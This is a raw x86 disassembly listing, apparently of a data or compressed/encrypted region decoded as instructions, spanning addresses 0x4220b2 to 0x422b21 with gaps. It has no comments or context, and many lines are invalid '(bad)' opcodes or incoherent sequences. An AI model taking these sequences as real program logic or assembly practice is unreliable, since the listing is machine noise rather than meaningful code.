  4220b2:	lahf   
  4220b3:	pop    esp
  4220b4:	pop    edx
  4220b5:	pop    eax
  4220b6:	ins    DWORD PTR es:[edi],dx
  4220b7:	dec    edi
  4220b8:	dec    ecx
  4220b9:	test   BYTE PTR [eax],0x5e
  4220bc:	xlat   BYTE PTR ds:[ebx]
  4220bd:	xchg   ebx,eax
  4220be:	add    eax,0x7e97be77
  4220c3:	retf   0x2627
  4220c6:	sbb    eax,0x695db7ce
  4220cb:	imul   ebx,esp,0x10
  4220ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220cf:	(bad)  
  4220d0:	jg     0x4220ae
  4220d2:	or     al,BYTE PTR [ebx]
  4220d4:	es adc eax,0xa0a73
  4220da:	jbe    0x422061
  4220dc:	imul   eax,edi,0xffffffa7
  4220df:	xlat   BYTE PTR ds:[ebx]
  4220e0:	dec    edi
  4220e1:	in     al,dx
  4220e2:	retf   
  4220e3:	ja     0x4220cf
  4220e5:	lods   eax,DWORD PTR ds:[esi]
  4220e6:	(bad)  
  4220e8:	stos   BYTE PTR es:[edi],al
  4220e9:	iret   
  4220ea:	and    DWORD PTR [eax-0x24],eax
  4220ed:	jae    0x42211e
  4220ef:	or     eax,0xb840469a
  4220f4:	lds    esi,FWORD PTR [edx+0x52]
  4220f7:	add    al,BYTE PTR [edi+0x3a]
  4220fa:	mov    ch,0x9d
  4220fc:	xor    ah,BYTE PTR [ecx+0x75]
  4220ff:	mov    edi,0x6f7b5140
  422104:	loop   0x422183
  422106:	or     DWORD PTR [edi],eax
  422108:	adc    BYTE PTR [ecx],ah
  42210a:	sahf   
  42210b:	inc    eax
  42210c:	dec    esp
  42210d:	(bad)  
  42210e:	mov    edx,0xbc099795
  422113:	mov    ebx,0xc4864d39
  422118:	(bad)  [edx-0x55]
  42211b:	adc    dh,0x82
  42211e:	add    eax,ebp
  422120:	in     al,0x24
  422122:	push   ss
  422123:	dec    esp
  422124:	and    eax,0xf60ba4f8
  422129:	mov    edi,DWORD PTR [esi-0x182bfa0a]
  42212f:	fwait
  422130:	ss loope 0x4220dc
  422133:	add    BYTE PTR ds:0xd2de44c,bl
  422139:	cmp    ebx,DWORD PTR [edx+0x18]
  42213c:	pop    es
  42213d:	lea    ebx,[edi]
  42213f:	mov    ch,0xe1
  422141:	inc    ebx
  422142:	daa    
  422143:	test   BYTE PTR gs:[ebp+ecx*1+0x4],dh
  422148:	mov    ds:0x627f1dbc,eax
  42214d:	push   esi
  42214e:	mov    ecx,DWORD PTR [eax+edx*4]
  422151:	int    0x8c
  422153:	xor    dh,BYTE PTR [esi]
  422155:	jecxz  0x422155
  422157:	repnz fsub QWORD PTR [edx+edx*2]
  42215b:	shl    BYTE PTR [eax+0xc],1
  42215e:	xor    esp,DWORD PTR [ebp+0x47]
  422161:	push   ss
  422162:	inc    edx
  422163:	rep ins BYTE PTR es:[edi],dx
  422165:	bound  ebx,QWORD PTR ds:0xc93f63ae
  42216b:	jmp    FWORD PTR [edx]
	...
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    esi,DWORD PTR [esi]
  4221e3:	and    BYTE PTR [eax-0xf],bl
  4221e6:	shr    BYTE PTR [ebp+0x1],1
  4221e9:	add    bh,bh
  4221eb:	add    BYTE PTR [eax],al
  4221ed:	add    BYTE PTR [edx+edx*4],ch
  4221f0:	and    DWORD PTR [eax+ebp*4-0x691dce77],0xffffff86
  4221f8:	mov    edx,0x8f8849d7
  4221fd:	and    cl,bh
  4221ff:	dec    eax
  422200:	lock fwait
  422202:	addr16 xchg esp,eax
  422204:	push   ebx
  422205:	les    esi,FWORD PTR [edx-0x58]
  422208:	push   eax
  422209:	lds    ecx,FWORD PTR [ecx-0x433271db]
  42220f:	push   esp
  422210:	xor    al,0x78
  422212:	imul   esp,DWORD PTR [ebx],0xffffffb8
  422215:	mov    ecx,0x3a40c1e2
  42221a:	fist   DWORD PTR [edi]
  42221c:	rcr    BYTE PTR ds:[ecx-0x620ba60d],1
  422223:	lods   eax,DWORD PTR ds:[esi]
  422224:	fist   DWORD PTR [edx-0x4b]
  422227:	jecxz  0x4221bd
  422229:	inc    ecx
  42222a:	cwde   
  42222b:	mov    edx,0x2cb47a21
  422230:	outs   dx,DWORD PTR ds:[esi]
  422231:	push   ds
  422232:	xor    cl,BYTE PTR [ebx-0xdbc14d7]
  422238:	push   edx
  422239:	xchg   ebp,eax
  42223a:	dec    esp
  42223b:	xor    eax,0x55adcd05
  422240:	push   0xffffffdd
  422242:	jecxz  0x4222a3
  422244:	data16 (bad) 
  422246:	mov    dl,0xd6
  422248:	jno    0x4221f6
  42224a:	fild   DWORD PTR [edx+edi*2]
  42224d:	popf   
  42224e:	xor    BYTE PTR [eax+0x10],bl
  422251:	imul   eax,DWORD PTR [eax-0x62],0x62
  422255:	inc    eax
  422256:	mov    al,ds:0xf5300fd4
  42225b:	pop    es
  42225c:	fwait
  42225d:	pop    ebx
  42225e:	hlt    
  42225f:	je     0x4221f9
  422261:	ins    BYTE PTR es:[edi],dx
  422262:	stc    
  422263:	test   dh,bl
  422265:	arpl   WORD PTR [edx],ax
  422267:	xor    DWORD PTR [ecx],0xffffff95
  42226a:	rcl    dh,0xec
  42226d:	xlat   BYTE PTR ds:[ebx]
  42226e:	sbb    eax,0x291009b6
  422273:	sbb    BYTE PTR [ebp+0xe],cl
  422276:	cli    
  422277:	mov    ebx,0x1f97b3b7
  42227c:	mov    al,0x7d
  42227e:	ror    DWORD PTR [edi+0x38],1
  422281:	sbb    DWORD PTR [esi],ebx
  422283:	push   esi
  422284:	and    DWORD PTR [edi],0xf14c0af4
  42228a:	mov    ch,0x24
  42228c:	and    eax,0xd9e2ef8b
  422291:	(bad)  
  422293:	nop
  422294:	xchg   ebx,eax
  422295:	push   edx
  422296:	xor    BYTE PTR [ecx+0x49066f88],al
  42229c:	sub    DWORD PTR [eax],esi
  42229e:	sbb    DWORD PTR [ecx+0x12777729],0x80ece107
  4222a8:	in     al,dx
  4222a9:	jl     0x422274
  4222ab:	into   
  4222ac:	cli    
  4222ad:	jo     0x4222fc
  4222af:	mov    cl,0xd1
  4222b1:	pop    edx
  4222b2:	or     DWORD PTR ds:0x3a7176da,esp
  4222b8:	jns    0x4222e0
  4222ba:	in     eax,0x6d
  4222bc:	mov    ah,0x23
  4222be:	pop    eax
  4222bf:	ss or  eax,0x6ead4f9a
  4222c5:	sbb    BYTE PTR [ebx+edx*1],bh
  4222c8:	dec    edx
  4222c9:	dec    esi
  4222ca:	popf   
  4222cb:	mov    ?,WORD PTR [ecx+0x200eb52d]
  4222d1:	sbb    eax,0x7917e761
  4222d6:	xchg   esi,ebx
  4222d8:	into   
  4222d9:	xchg   dl,cl
  4222db:	loope  0x42226d
  4222dd:	ss iret 
  4222df:	ret    0xb836
  4222e2:	mov    ss,WORD PTR [eax+0x2d]
  4222e5:	xor    ch,bh
  4222e7:	clc    
  4222e8:	or     dl,0xf2
  4222eb:	and    eax,0xf0
	...
  422354:	add    BYTE PTR [eax],al
  422356:	(bad)  
  422357:	in     eax,dx
  422358:	lods   eax,DWORD PTR ds:[esi]
  422359:	imul   edi
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	fld    QWORD PTR [edi+0x6ecf0900]
  422368:	add    DWORD PTR [eax],eax
  42236a:	inc    DWORD PTR [eax]
  42236c:	add    BYTE PTR [eax],al
  42236e:	in     al,dx
  42236f:	cdq    
  422370:	adc    ch,BYTE PTR [eax-0x4c]
  422373:	nop
  422374:	cmp    esp,ecx
  422376:	clc    
  422377:	test   eax,0xadd68e8f
  42237c:	stc    
  42237d:	sbb    BYTE PTR [eax],bl
  42237f:	cmp    DWORD PTR ds:0x1db64345,edx
  422385:	jno    0x4223e6
  422387:	push   es
  422388:	jmp    0xa5af:0x483e0fd4
  42238f:	mov    ds:0x2384cf24,al
  422394:	push   eax
  422395:	mov    ds,WORD PTR [ebp+ecx*4+0x6b3b78a2]
  42239c:	sahf   
  42239d:	sub    BYTE PTR [ecx-0x4e],cl
  4223a0:	fnsave [eax-0x30]
  4223a3:	xchg   edi,eax
  4223a4:	arpl   WORD PTR [ebx],di
  4223a6:	lods   eax,DWORD PTR ds:[esi]
  4223a7:	imul   esp,ebx,0xe4bc5142
  4223ad:	push   edi
  4223ae:	xchg   esp,eax
  4223af:	pcmpeqw mm0,mm4
  4223b2:	pop    ebx
  4223b3:	pop    ecx
  4223b4:	arpl   WORD PTR [edi],cx
  4223b6:	inc    edx
  4223b7:	or     DWORD PTR ds:0xf7975c9c,edx
  4223bd:	ret    0x5c4d
  4223c0:	add    bl,BYTE PTR [eax+ebp*2+0x68]
  4223c4:	pop    esi
  4223c5:	rcl    edi,1
  4223c7:	cmp    al,0x30
  4223c9:	push   esi
  4223ca:	cs pop eax
  4223cc:	lock jo 0x422360
  4223cf:	push   eax
  4223d0:	or     al,0x95
  4223d2:	mov    cl,0x68
  4223d4:	mov    ch,0x7d
  4223d6:	sbb    al,0x10
  4223d8:	jnp    0x422405
  4223da:	ret    0x87e4
  4223dd:	mov    bh,0x6
  4223df:	mov    ebp,0xfa75746c
  4223e4:	in     al,0xf8
  4223e6:	mov    edi,0x20dc443c
  4223eb:	cmp    al,0xca
  4223ed:	scas   eax,DWORD PTR es:[edi]
  4223ee:	mov    al,0x58
  4223f0:	mov    ah,0x28
  4223f2:	out    0x4b,eax
  4223f4:	ja     0x42238e
  4223f6:	adc    BYTE PTR [ebp+0x66],dl
  4223f9:	dec    edx
  4223fa:	outs   dx,DWORD PTR cs:[esi]
  4223fc:	cdq    
  4223fd:	and    BYTE PTR [esi+0x5bd7f930],0x2f
  422404:	cdq    
  422405:	cmp    dl,dh
  422407:	xchg   ebp,eax
  422408:	aam    0xd5
  42240a:	popw   es
  42240c:	arpl   bx,di
  42240e:	sub    esi,0xf7d93781
  422414:	popf   
  422415:	mov    bh,0x75
  422417:	xchg   ebx,eax
  422418:	push   edx
  422419:	mov    dh,0x99
  42241b:	je     0x4223a5
  42241d:	fst    st(3)
  42241f:	push   0x12
  422421:	bound  esi,QWORD PTR [esp+ebx*2+0x2e573be5]
  422428:	mov    edi,0x46016e
  42242d:	mov    dh,0xf4
  42242f:	jg     0x42247d
  422431:	mov    edx,gs
  422433:	stos   DWORD PTR es:[edi],eax
  422434:	pushf  
  422435:	das    
  422436:	jo     0x422461
  422438:	dec    edx
  422439:	adc    DWORD PTR [ebx-0x4f],0x61138acb
  422440:	cmp    ebx,DWORD PTR ds:[ebp-0x73ac7463]
  422447:	sub    al,0x97
  422449:	out    0xce,eax
  42244b:	pop    es
  42244c:	fist   WORD PTR [eax-0x5fba056d]
  422452:	ret    
  422453:	mov    bh,0x82
  422455:	push   esi
  422456:	adc    BYTE PTR [ebp-0xe],ch
  422459:	pushf  
  42245a:	dec    edi
  42245b:	inc    bl
  42245d:	test   DWORD PTR [eax-0x69],esp
  422460:	loopne 0x422409
  422462:	daa    
  422463:	int3   
  422464:	leave  
  422465:	xlat   BYTE PTR ds:[ebx]
  422466:	cmc    
  422467:	fsub   st,st(2)
  422469:	outs   dx,BYTE PTR ds:[esi]
  42246a:	in     eax,dx
  42246b:	add    al,0x2a
	...
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	mov    ecx,0xcec25074
  4224e7:	outs   dx,DWORD PTR ds:[esi]
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	inc    DWORD PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	retf   0xf9bc
  4224f1:	imul   ebp,edx,0xf38249d3
  4224f7:	or     DWORD PTR cs:[eax+0x617d26d8],esp
  4224fe:	pop    edx
  4224ff:	retf   
  422500:	in     eax,0x64
  422502:	nop
  422503:	and    al,0xf
  422505:	push   ds
  422506:	xor    BYTE PTR [esi-0x17],al
  422509:	fistp  WORD PTR [edx-0x31]
  42250c:	cmp    al,0x81
  42250e:	sbb    BYTE PTR [edi+0x3d],dl
  422511:	ins    BYTE PTR es:[edi],dx
  422512:	push   edx
  422513:	or     BYTE PTR [eax-0x2e],al
  422516:	lock mov bh,BYTE PTR es:[ecx]
  42251a:	cdq    
  42251b:	add    esp,DWORD PTR [ebp+0x6334ca59]
  422521:	pop    es
  422522:	mov    cl,0x5c
  422524:	ds xchg ebp,eax
  422526:	mov    ecx,0x7f1041d0
  42252b:	adc    eax,0xd46fa70a
  422530:	mov    al,0x3b
  422532:	aad    0xfb
  422534:	xchg   ebp,eax
  422535:	inc    ebp
  422536:	xchg   esp,eax
  422537:	mul    ah
  422539:	and    BYTE PTR [esi],dh
  42253b:	inc    edx
  42253c:	ss loopne 0x422541
  42253f:	add    ebx,0xb2ae0559
  422545:	ret    0x4610
  422548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422549:	or     ecx,DWORD PTR [esi]
  42254b:	call   0xe5735ca0
  422550:	cli    
  422551:	rol    BYTE PTR [ecx],1
  422553:	add    esi,DWORD PTR [eax]
  422555:	push   0xe32bc1ba
  42255a:	mov    bh,BYTE PTR [edx-0xc48aa2]
  422560:	push   ebx
  422561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422562:	jbe    0x4225a4
  422564:	sub    BYTE PTR [edi-0x79d34c62],0x2
  42256b:	scas   eax,DWORD PTR es:[edi]
  42256c:	dec    edx
  42256d:	add    al,al
  42256f:	adc    al,0x4f
  422571:	jo     0x4225c2
  422573:	das    
  422574:	pop    esi
  422575:	fist   WORD PTR [eax+0x64]
  422578:	out    dx,eax
  422579:	lods   al,BYTE PTR ds:[esi]
  42257a:	rcl    BYTE PTR [esi+edi*4-0x41],0x57
  42257f:	xchg   ebp,eax
  422580:	jecxz  0x422532
  422582:	outs   dx,DWORD PTR ds:[esi]
  422583:	inc    si
  422585:	enter  0xd57e,0xb0
  422589:	imul   BYTE PTR [ecx+0x7bf908a7]
  42258f:	sub    BYTE PTR es:0xa0bc078d,ch
  422596:	cld    
  422597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422598:	sub    ah,bl
  42259a:	shl    dh,0x19
  42259d:	add    DWORD PTR [eax],ecx
  42259f:	push   edx
  4225a0:	int3   
  4225a1:	aas    
  4225a2:	rol    DWORD PTR [eax-0x5c],0x8e
  4225a6:	in     al,dx
  4225a7:	sbb    DWORD PTR [ecx+0x12221796],0xffffff95
  4225ae:	fldenv [esi]
  4225b0:	xchg   ebp,eax
  4225b1:	je     0x422585
  4225b3:	mov    ecx,0xbde06cd9
  4225b8:	popa   
  4225b9:	mov    ch,dh
  4225bb:	std    
  4225bc:	push   edi
  4225bd:	(bad)  
  4225be:	lods   eax,DWORD PTR ds:[esi]
  4225bf:	arpl   WORD PTR [eax+0x76],dx
  4225c2:	pusha  
  4225c3:	mov    al,ds:0x90f5dc1b
  4225c8:	xor    bl,cl
  4225ca:	call   0x240e:0x582a9660
  4225d1:	(bad)  
  4225d2:	fcomp  QWORD PTR [edi]
  4225d4:	pop    edi
  4225d5:	ret    0x99f7
  4225d8:	ror    BYTE PTR [esi-0x32],cl
  4225db:	addr16 jle 0x4225e1
  4225de:	test   DWORD PTR [esi],esi
  4225e0:	mov    ch,0x7a
  4225e2:	xchg   esi,eax
  4225e3:	(bad)  
  4225e4:	dec    edi
  4225e5:	adc    edx,DWORD PTR [eax]
  4225e7:	adc    al,0xec
  4225e9:	fucomi st,st(3)
  4225eb:	jns    0x42259a
	...
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x23d25d08]
  422664:	xchg   ebx,eax
  422665:	jg     0x422634
  422667:	jo     0x42266a
  422669:	add    bh,bh
  42266b:	add    BYTE PTR [eax],al
  42266d:	add    BYTE PTR [ebp-0x431f4369],dl
  422673:	bswap  ecx
  422675:	les    ebx,FWORD PTR [eax+ebp*8+0x6003ba93]
  42267c:	dec    ecx
  42267d:	and    esp,esp
  42267f:	cmp    BYTE PTR [ecx+0x3aa43bb],ah
  422685:	call   0xd2e16de7
  42268a:	setnp  BYTE PTR [edi+0x100c1e86]
  422691:	dec    esi
  422692:	adc    dh,BYTE PTR [ecx]
  422694:	add    cl,BYTE PTR [eax]
  422696:	mov    bl,0x6e
  422698:	jle    0x42263e
  42269a:	shl    bl,0xea
  42269d:	jne    0x4226c8
  42269f:	jmp    0x1276:0xd0469749
  4226a6:	push   ebx
  4226a7:	(bad)  
  4226a8:	sbb    BYTE PTR [ebp-0x2b],ah
  4226ab:	jg     0x422677
  4226ad:	outs   dx,DWORD PTR ds:[esi]
  4226ae:	and    edi,edi
  4226b0:	mov    dl,0xd4
  4226b2:	nop
  4226b3:	imul   eax,DWORD PTR [edi],0x42
  4226b6:	cmp    bh,dl
  4226b8:	fwait
  4226b9:	pop    ebx
  4226ba:	(bad)  
  4226bb:	jmp    0x422707
  4226bd:	out    0x5b,eax
  4226bf:	jle    0x4226e4
  4226c1:	mov    ch,0x6c
  4226c3:	ss inc eax
  4226c5:	adc    esi,DWORD PTR [edx+ebx*2+0x594944d1]
  4226cc:	ficom  WORD PTR [esi-0x57]
  4226cf:	adc    al,0xb4
  4226d1:	push   ebx
  4226d2:	sbb    eax,0x601566c8
  4226d7:	push   edi
  4226d8:	lds    ecx,FWORD PTR [eax]
  4226da:	sub    eax,0xc0a12fdb
  4226df:	adc    BYTE PTR [ecx+0x5b],dl
  4226e2:	mov    al,ds:0xfa5a4007
  4226e7:	jno    0x4226ae
  4226e9:	xchg   esp,eax
  4226ea:	out    dx,al
  4226eb:	lods   eax,DWORD PTR ds:[esi]
  4226ec:	add    eax,0x9d252f75
  4226f1:	sbb    bh,BYTE PTR [ebx+0x33]
  4226f4:	into   
  4226f5:	jmp    0x4226eb
  4226f7:	push   esi
  4226f8:	push   esi
  4226f9:	and    BYTE PTR [edx-0x24],dl
  4226fc:	inc    esp
  4226fd:	xlat   BYTE PTR fs:[ebx]
  4226ff:	mov    ebp,0x557bff40
  422704:	mov    al,ds:0xb713ce5d
  422709:	mov    ds:0x80ed0408,al
  42270e:	rcl    BYTE PTR [ebp+0x43],0x9c
  422712:	sti    
  422713:	retf   0xb5de
  422716:	int    0x79
  422718:	cmp    eax,0x368e4382
  42271d:	cdq    
  42271e:	xor    al,0xf4
  422720:	fwait
  422721:	jmp    0x4226ae
  422723:	adc    BYTE PTR [edi],al
  422725:	pop    ss
  422726:	es pop esp
  422728:	inc    ebx
  422729:	dec    esp
  42272a:	(bad)  
  42272b:	scas   eax,DWORD PTR es:[edi]
  42272c:	mov    eax,0x1f7f924f
  422731:	sbb    DWORD PTR [ecx-0x2d],esi
  422734:	cwde   
  422735:	les    edi,FWORD PTR [ecx+0x16]
  422738:	xor    BYTE PTR [edx+0x2a],cl
  42273b:	outs   dx,DWORD PTR ds:[esi]
  42273c:	sub    al,0x14
  42273e:	xchg   BYTE PTR [edx+0x11],dh
  422741:	mov    ch,BYTE PTR [edx]
  422743:	xchg   ebx,eax
  422744:	neg    BYTE PTR [edi+esi*8+0x56]
  422748:	jbe    0x42277f
  42274a:	in     eax,dx
  42274b:	add    al,BYTE PTR [ebp+0x1d]
  42274e:	bound  eax,QWORD PTR ds:0x5e9111d4
  422754:	sbb    BYTE PTR [eax+ebp*2+0x6d717b03],dl
  42275b:	mov    ds:0xae606985,al
  422760:	xchg   DWORD PTR [eax],ebp
  422762:	add    DWORD PTR [edx+0x29],ecx
  422765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422766:	cmp    bh,BYTE PTR [ebx-0x6e3dac7c]
  42276c:	mov    edi,0x0
	...
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x9b7f01c8
  4227e3:	in     eax,dx
  4227e4:	fistp  WORD PTR [esi]
  4227e6:	int3   
  4227e7:	jno    0x4227ea
  4227e9:	add    bh,bh
  4227eb:	add    BYTE PTR [eax],al
  4227ed:	add    BYTE PTR ds:0x92772867,ch
  4227f3:	sbb    eax,0x2faaf514
  4227f8:	loopne 0x4227e8
  4227fa:	inc    esp
  4227fb:	add    cl,BYTE PTR [esi+0x1d]
  4227fe:	test   eax,0x318be006
  422803:	xchg   esp,eax
  422804:	fwait
  422805:	add    ecx,DWORD PTR [eax-0x6e05dab3]
  42280b:	adc    bh,BYTE PTR [esp+ecx*1]
  42280e:	push   ebx
  42280f:	data16 hlt 
  422811:	cmc    
  422812:	or     eax,DWORD PTR ds:0x30b6c988
  422818:	cmp    cl,BYTE PTR [ebp+0x1c]
  42281b:	loopne 0x4227ea
  42281d:	push   es
  42281e:	push   ss
  42281f:	xchg   ebx,eax
  422820:	pop    ebp
  422821:	mov    ds:0xcf2e2a1f,al
  422826:	stos   BYTE PTR es:[edi],al
  422827:	test   al,0xc4
  422829:	ret    0x1282
  42282c:	mov    esp,0x416bea09
  422831:	retf   
  422832:	dec    edx
  422833:	mov    ss,WORD PTR [ecx]
  422835:	sbb    DWORD PTR [ecx+0x12],edx
  422838:	nop
  422839:	lods   al,BYTE PTR ds:[esi]
  42283a:	add    ebp,DWORD PTR [ebx]
  42283c:	leave  
  42283d:	mov    edi,0xe39f9dfb
  422842:	ins    BYTE PTR es:[edi],dx
  422843:	inc    esi
  422844:	adc    al,0xe8
  422846:	cmp    BYTE PTR [ebx],dh
  422848:	or     ebp,DWORD PTR [eax]
  42284a:	jns    0x4227e4
  42284c:	sbb    eax,0x8dcb1803
  422851:	arpl   sp,ax
  422853:	rcl    eax,1
  422855:	shl    DWORD PTR [ecx],1
  422857:	cmp    BYTE PTR [ebx-0x64],ah
  42285a:	(bad)  
  42285b:	loopne 0x422846
  42285d:	divps  xmm3,XMMWORD PTR ds:0x4c40cd60
  422864:	je     0x4228cd
  422866:	mov    ecx,0xa157b0c7
  42286b:	stos   DWORD PTR es:[edi],eax
  42286c:	mov    ds:0x23227f4d,al
  422871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422872:	call   edx
  422874:	in     eax,0x9a
  422876:	mov    eax,0xdb84998e
  42287b:	(bad)  
  42287c:	das    
  42287d:	cmp    al,0xef
  42287f:	jo     0x4228ab
  422881:	lock xor eax,0xcbae694f
  422887:	inc    eax
  422888:	aam    0xee
  42288a:	cld    
  42288b:	call   0x95bec82d
  422890:	shl    DWORD PTR [ecx+0x1af59cdf],cl
  422896:	out    dx,eax
  422897:	inc    edx
  422898:	out    dx,eax
  422899:	xor    eax,0xc6cba2f1
  42289e:	out    dx,eax
  42289f:	test   al,0x8e
  4228a1:	mov    DWORD PTR [eax],eax
  4228a3:	push   edi
  4228a4:	push   esp
  4228a5:	inc    ebx
  4228a6:	(bad)  [ebx+edi*1+0x74]
  4228aa:	and    edx,DWORD PTR [ecx]
  4228ac:	jmp    0x4228d2
  4228ae:	nop
  4228af:	pop    ecx
  4228b0:	mov    cl,0xdd
  4228b2:	aam    0x82
  4228b4:	sti    
  4228b5:	xchg   edi,eax
  4228b6:	pop    ecx
  4228b7:	sbb    eax,0xbd3afaf2
  4228bc:	(bad)  
  4228bd:	(bad)  
  4228be:	in     eax,dx
  4228bf:	mov    BYTE PTR [ebp+0x4dd07db8],cl
  4228c5:	div    dh
  4228c7:	in     eax,0x9c
  4228c9:	xor    BYTE PTR [edx+0x43a8378b],cl
  4228cf:	out    0x1e,al
  4228d1:	adc    BYTE PTR [edx],0xf0
  4228d4:	nop
  4228d5:	test   al,0x2e
  4228d7:	xor    bh,BYTE PTR [edx+0x44]
  4228da:	(bad)  
  4228db:	cli    
  4228dc:	xchg   ebx,eax
  4228dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228de:	mov    esp,DWORD PTR [ebx]
  4228e0:	shl    BYTE PTR [ebx],0x44
  4228e3:	ret    0x5a59
  4228e6:	loop   0x42292d
  4228e8:	imul   esp,esi,0x97d506
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4229df
  422963:	test   al,0x8d
  422965:	loope  0x422932
  422967:	jb     0x42296a
  422969:	add    bh,bh
  42296b:	add    BYTE PTR [eax],al
  42296d:	add    BYTE PTR [edx-0x1359a707],ah
  422973:	jbe    0x422917
  422975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422976:	push   edi
  422977:	mov    edi,0x7c57be57
  42297c:	outs   dx,DWORD PTR ds:[esi]
  42297d:	xlat   BYTE PTR ds:[ebx]
  42297e:	stc    
  42297f:	leave  
  422980:	sbb    bl,cl
  422982:	mov    esp,0xb633c584
  422987:	add    eax,0x80f938c3
  42298c:	jmp    0xbdc6c8a8
  422991:	(bad)  
  422992:	mov    ds:0x83b48931,al
  422997:	add    eax,0x94961044
  42299c:	hlt    
  42299d:	shr    DWORD PTR [edi-0x716a01a5],1
  4229a3:	das    
  4229a4:	pop    ss
  4229a5:	push   esp
  4229a6:	add    DWORD PTR [ebx+edx*8],0x29
  4229aa:	ins    BYTE PTR es:[edi],dx
  4229ab:	test   DWORD PTR [ebp-0x4ca9d7df],edi
  4229b1:	js     0x422958
  4229b3:	xchg   ecx,eax
  4229b4:	jns    0x42298b
  4229b6:	inc    eax
  4229b7:	adc    al,BYTE PTR [eax]
  4229b9:	cmp    BYTE PTR [eax],ah
  4229bb:	and    BYTE PTR [edi+0x2f],0x44
  4229bf:	imul   ecx,DWORD PTR [eax-0x13664595],0x690e83f5
  4229c9:	pop    ds
  4229ca:	cld    
  4229cb:	inc    edx
  4229cc:	sbb    ecx,eax
  4229ce:	loope  0x4229d1
  4229d0:	mov    eax,0x179b6ff1
  4229d5:	sbb    al,0xaa
  4229d7:	dec    ecx
  4229d8:	aaa    
  4229d9:	mov    ch,0x43
  4229db:	jne    0x4229c8
  4229dd:	stos   BYTE PTR es:[edi],al
  4229de:	in     al,0xb7
  4229e0:	es xchg esp,eax
  4229e2:	push   cs
  4229e3:	pop    es
  4229e4:	js     0x4229d9
  4229e6:	sbb    al,0x59
  4229e8:	xchg   esp,eax
  4229e9:	inc    edi
  4229ea:	ret    0xe742
  4229ed:	add    eax,0x1762e57
  4229f2:	sbb    BYTE PTR [ebx+0x13],ch
  4229f5:	lock cmp edi,DWORD PTR [ebp-0x5082a338]
  4229fc:	das    
  4229fd:	stos   BYTE PTR es:[edi],al
  4229fe:	arpl   sp,si
  422a00:	cmp    bh,ch
  422a02:	jecxz  0x422a35
  422a04:	mov    ebp,0x4fb9ddbd
  422a09:	cmp    al,BYTE PTR [ebx]
  422a0b:	xchg   ebp,eax
  422a0c:	jl     0x4229ff
  422a0e:	adc    BYTE PTR [edi],ah
  422a10:	mov    eax,ds:0x487d81e3
  422a15:	mov    eax,ds:0xaa5009cd
  422a1a:	pop    ecx
  422a1b:	(bad)  
  422a1c:	push   esi
  422a1d:	lahf   
  422a1e:	lods   al,BYTE PTR ds:[esi]
  422a1f:	in     al,dx
  422a20:	test   al,0xed
  422a22:	mov    fs,WORD PTR [edi+0x32]
  422a25:	pop    es
  422a26:	gs and eax,0xab2c62c0
  422a2c:	adc    al,0xff
  422a2e:	fild   QWORD PTR [edx+0x34]
  422a31:	adc    eax,0x887c5b69
  422a36:	imul   esi,DWORD PTR ds:0x2517b82,0xf7162de1
  422a40:	sbb    cl,bl
  422a42:	or     esp,DWORD PTR [edx]
  422a44:	cmp    BYTE PTR [ebp+ebp*4+0x24],dh
  422a48:	test   DWORD PTR [edx+0x68],ebx
  422a4b:	or     DWORD PTR [ecx],esp
  422a4d:	leave  
  422a4e:	adc    DWORD PTR [edi],ecx
  422a50:	cmp    edx,DWORD PTR [ebx]
  422a52:	nop
  422a53:	pushf  
  422a54:	addr16 ror ch,cl
  422a57:	ds fst st(1)
  422a5a:	addr16 push cs
  422a5c:	push   cs
  422a5d:	aam    0x86
  422a5f:	and    al,0x98
  422a61:	lahf   
  422a62:	mov    esp,DWORD PTR [esi-0x790a73f3]
  422a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a69:	sar    al,0x25
  422a6c:	jecxz  0x422a6e
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	aaa    
  422ae3:	inc    ecx
  422ae4:	sub    BYTE PTR [eax-0x36],bl
  422ae7:	jae    0x422aea
  422ae9:	add    bh,bh
  422aeb:	add    BYTE PTR [eax],al
  422aed:	add    BYTE PTR [ebp-0x5e],ah
  422af0:	(bad)  
  422af1:	pop    eax
  422af2:	test   DWORD PTR [edx-0x7957bd09],ebp
  422af8:	sbb    al,0xb
  422afa:	sti    
  422afb:	pop    ebp
  422afc:	sti    
  422afd:	aad    0x24
  422aff:	add    BYTE PTR [edx-0x687789b7],0x8
  422b06:	dec    edx
  422b07:	test   eax,0xcd13b219
  422b0c:	push   esi
  422b0d:	sub    al,BYTE PTR [ebp+edi*2+0x42]
  422b11:	data16 repz add BYTE PTR [edi],bl
  422b15:	repnz or dl,0x4c
  422b19:	data16 hlt 
  422b1b:	ins    BYTE PTR es:[edi],dx
  422b1c:	or     eax,0x70182d9
  422b21:	retf   
